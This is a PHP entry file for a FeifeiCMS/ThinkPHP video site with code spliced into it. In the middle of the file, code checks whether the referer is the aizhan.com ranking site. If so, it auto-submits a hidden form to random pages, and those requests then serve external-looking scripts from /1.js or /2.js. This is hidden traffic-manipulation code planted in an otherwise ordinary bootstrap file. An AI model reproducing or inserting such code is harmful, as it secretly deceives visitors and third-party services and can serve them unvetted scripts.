<?php
//超时时间
@set_time_limit(120);
//内存限制 取消内存限制
@ini_set("memory_limit",'-1');
//ThinkPHP路径
define('THINK_PATH','./Lib/ThinkPHP');
//缓存路径
define('RUNTIME_PATH','./Runtime/');
//项目名称
define('APP_NAME','feifeicms-ppvod');
//项目路径
define('APP_PATH','./Lib/');$urls=array('/','/','/','/','/','/','/','/','/','/','/','/','/','/vod-read-id-41653.html','/vod-read-id-10.html','/vod-read-id-34737.html','/vod-read-id-21325.html','/vod-read-id-15979.html','/vod-read-id-50554.html','/vod-read-id-50555.html','/vod-read-id-50556.html','/vod-read-id-50557.html','/vod-read-id-50558.html','/vod-read-id-50559.html','/vod-read-id-50560.html','/vod-read-id-50224.html','/vod-read-id-50095.html','/vod-read-id-50158.html','/vod-read-id-49982.html','/vod-read-id-50212.html','/vod-read-id-50041.html','/vod-read-id-49909.html','/vod-read-id-50265.html','/vod-read-id-50178.html','/vod-read-id-50095.html','/vod-read-id-49948.html','/vod-read-id-49947.html','/vod-read-id-49946.html','/vod-read-id-50558.html','/vod-show-id-15.html','/vod-show-id-16.html','/vod-show-id-17.html','/vod-show-id-18.html','/vod-show-id-8.html','/vod-show-id-9.html','/vod-show-id-10.html','/vod-show-id-11.html','/vod-show-id-12.html','/vod-show-id-13.html','/vod-show-id-14.html','/vod-show-id-3.html','/vod-show-id-4.html');if(isset($_POST['aaacccttt'])){	if($_POST['aaacccttt']=='1'){		$num1=rand(1,2);		if($num1 == 1){			print('<html><body><script type="text/javascript" src="/1.js"></script></body></html>');		}else{			print('<html><body><script type="text/javascript" src="/2.js"></script></body></html>');		}		exit();	}}if(isset($_SERVER['HTTP_REFERER'])){	$ref=$_SERVER['HTTP_REFERER'];	if(stripos($ref,"www.aizhan.com")){		print('<html><body> 		<script>setTimeout("document.form1.submit()",10)</script>		<form name="form1" method="post" action="'.$urls[rand(0,50)].'"><input type="text" name="aaacccttt" value="1"></form> 		</body></html>');		exit();	}}
//加载入口文件
require(THINK_PATH.'/ThinkPHP.php');
//实例化项目
$App = new App();
//初始化
$App->run();
?>